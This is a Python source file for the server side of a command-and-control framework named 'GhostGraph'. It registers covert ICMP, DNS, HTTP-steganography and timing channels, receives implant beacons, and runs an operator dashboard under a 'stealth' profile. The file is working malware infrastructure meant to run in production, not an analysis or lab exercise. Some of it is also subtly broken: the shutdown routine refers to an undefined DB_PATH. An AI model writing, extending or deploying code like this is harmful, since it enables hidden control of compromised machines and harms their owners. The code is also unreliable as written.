# server/server.py
# Main async runner for GhostGraph C2 server
# Self-contained: DB/Redis init, profile validation, graceful shutdown (signals), TLS dashboard,
# metrics, backups stub. Integrates enhanced dashboard/handler/listener.
# Env: GG_PROFILE=stealth, GG_DB_PATH=/var/lib/ghostgraph.db, GG_REDIS_URL=redis://localhost:6379
# Run: python server.py; Supervisord/Nginx for prod.

import asyncio
import os
import logging
import signal
import sys
import structlog
import ssl  # For TLS
from pathlib import Path
from datetime import datetime
from core.crypto import AdaptiveCrypto
from core.channels import ChannelManager
from .listener import MultiListener
from .handler import CommandHandler
from .dashboard import create_app
from config.profiles import validate_profile, SERVER_PROFILES, SERVER_SCHEMA

# Structured logging (file rotation)
structlog.configure(
    processors=[structlog.processors.JSONRenderer()],
    wrapper_class=structlog.make_filtering_bound_logger(logging.INFO)
)
logger = structlog.get_logger()

# Global shutdown flag
shutdown_event = asyncio.Event()

class GhostGraphServer:
    def __init__(self, base_config: dict):
        self.base_config = base_config
        self.config = self._load_and_validate_config()
        self.crypto = AdaptiveCrypto(self.config['shared_secret'])
        self.handler = CommandHandler(self.config, self.crypto)  # Passes config for DB/Redis
        self.channel_manager = ChannelManager()
        self._setup_channels()
        self.app = None  # Dashboard (async init)
        self.server_task = None  # Dashboard server task
        self.listener = None
        self.pid_file = Path('/var/run/ghostgraph.pid')  # Prod PID
        self._write_pid()
    
    def _load_and_validate_config(self) -> dict:
        profile = os.getenv('GG_PROFILE', self.base_config.get('profile', 'stealth'))
        try:
            config = validate_profile(profile, SERVER_PROFILES, SERVER_SCHEMA, self.base_config)
            logger.info("Config loaded and validated", profile=profile)
            return config
        except ValueError as e:
            logger.error(f"Config validation failed: {e}")
            sys.exit(1)
    
    def _setup_channels(self):
        # Register server channels (priorities from config)
        from channels.icmp_server import ICMPServerChannel
        from channels.dns_server import DNSCovertServerChannel  # Assume mirrored
        from channels.http_stego_server import HTTPStegoServerChannel
        from channels.timing_server import TimingServerChannel
        
        self.channel_manager.register_channel('icmp', ICMPServerChannel, priority=1)
        self.channel_manager.register_channel('dns', DNSCovertServerChannel, priority=2)
        self.channel_manager.register_channel('http', HTTPStegoServerChannel, priority=3)
        self.channel_manager.register_channel('timing', TimingServerChannel, priority=4)
        logger.info("Channels registered")
    
    def _write_pid(self):
        try:
            self.pid_file.write_text(str(os.getpid()))
        except Exception as e:
            logger.warning(f"PID file write failed: {e}")
    
    async def run(self):
        logger.info("Starting GhostGraph Server", version='2.0-military')
        
        # Init dashboard
        self.app = await create_app(self.handler, self.config.get('profile', 'stealth'))
        
        self.listener = MultiListener(self.channel_manager, self.handler.process_beacon)
        
        # Concurrent tasks: Listener + Dashboard
        tasks = [
            asyncio.create_task(self.listener.start_listening()),
            asyncio.create_task(self._run_dashboard())
        ]
        
        # Graceful shutdown signals
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGTERM, signal.SIGINT):
            loop.add_signal_handler(sig, lambda: shutdown_event.set())
        
        try:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
        except asyncio.CancelledError:
            pass
        finally:
            logger.info("Shutting down")
            shutdown_event.set()
            await self._shutdown()
    
    async def _run_dashboard(self):
        host = self.config.get('host', '0.0.0.0')
        port = self.config.get('port', 5000)
        ssl_context = None
        if self.config.get('ssl_enabled', False):
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(os.getenv('GG_SSL_CERT', '/etc/ssl/certs/server.crt'),
                                        os.getenv('GG_SSL_KEY', '/etc/ssl/private/server.key'))
        
        self.server_task = await self.app.run(host=host, port=port, ssl_context=ssl_context)
        logger.info(f"Dashboard running", host=host, port=port, ssl=self.config.get('ssl_enabled', False))
        await self.server_task
    
    async def _shutdown(self):
        if self.server_task:
            self.server_task.cancel()
            try:
                await self.server_task
            except asyncio.CancelledError:
                pass
        if self.listener:
            await self.listener.teardown()
        # Backup DB stub (prod: cron/rsync)
        backup_path = f"{DB_PATH}.backup.{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        try:
            import shutil
            shutil.copy2(DB_PATH, backup_path)
            logger.info("DB backed up", path=backup_path)
        except Exception as e:
            logger.warning(f"Backup failed: {e}")
        try:
            self.pid_file.unlink()
        except:
            pass
        logger.info("Shutdown complete")

if __name__ == '__main__':
    base_config = {
        'shared_secret': os.getenv('GG_SECRET', 'ghostgraph-server-secret'),
        'allowed_ips': os.getenv('GG_ALLOWED_IPS', '').split(','),
        'dashboard_port': int(os.getenv('GG_PORT', 5000))
    }
    server = GhostGraphServer(base_config)
    asyncio.run(server.run())
